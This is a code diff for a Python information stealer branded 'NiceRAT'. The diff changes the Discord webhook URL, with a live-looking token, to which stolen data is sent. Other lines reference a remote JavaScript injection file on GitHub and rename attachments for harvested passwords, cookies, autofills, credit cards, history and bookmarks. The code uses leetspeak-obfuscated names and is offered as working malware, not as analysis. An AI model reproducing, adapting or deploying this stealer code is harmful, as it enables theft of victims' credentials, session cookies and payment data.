@@ -71,7 +71,7 @@ for module in ModuleRequirements:
 
 
 
-h00k = "https://ptb.discord.com/api/webhooks/1226217588959215726/AZaNnD4TIN-9sV-t0rsveiQxcROYaCVziI8BUa6CNPsUxdnW9mdHu7HnuQ55kQPXZ8_5"
+h00k = "https://ptb.discord.com/api/webhooks/1227695657461092362/GgjWwrCRkgIPAKymcCfvOA9cNuqh83ORQR35sPtdJM1bsczvwrBk3Fvx1M01F1PnhBUW"
 inj3c710n_url = f"https://raw.githubusercontent.com/0x00G/injection/main/index.js"
 
 class DATA_BLOB(Structure):
@@ -776,21 +776,21 @@ def G378r0W53r5(br0W53rP47H5):
         "embeds": [
             {
                 "title": f"NiceRAT | Password Stealer",
-                "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPasswords.txt]({filess[0]})",
+                "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [NiceRAT_Passwords.txt]({filess[0]})",
                 "color": 2895667,
                 "footer": {"text": f"NiceRAT",  
                 "icon_url": "https://raw.githubusercontent.com/0x00G/NiceRAT/main/img/Nice.png"}
             },
             {
                 "title": f"NiceRAT | Cookies Stealer",
-                "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({filess[1]})",
+                "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [NiceRAT_Cookies.txt]({filess[1]})",
                 "color": 2895667,
                 "footer": {"text": f"NiceRAT",  
                 "icon_url": "https://raw.githubusercontent.com/0x00G/NiceRAT/main/img/Nice.png"}
             },
             {
                 "title": f"NiceRAT | Browser Data",
-                "description": f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealHistories.txt]({filess[4]})\n\n<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealAutofills.txt]({filess[3]})\n\n<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCreditCards.txt]({filess[2]})\n\n:bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealBookmarks.txt]({filess[5]})",
+                "description": f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealHistories.txt]({filess[4]})\n\n<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n<a:CH_IconArrowRight:715585320178941993> • [NiceRAT_Autofills.txt]({filess[3]})\n\n<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n<a:CH_IconArrowRight:715585320178941993> • [NiceRAT_CreditCards.txt]({filess[2]})\n\n:bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n<a:CH_IconArrowRight:715585320178941993> • [NiceRAT_Bookmarks.txt]({filess[5]})",
                 "color": 2895667,
                 "footer": {"text": f"NiceRAT",  
                 "icon_url": "https://raw.githubusercontent.com/0x00G/NiceRAT/main/img/Nice.png"}
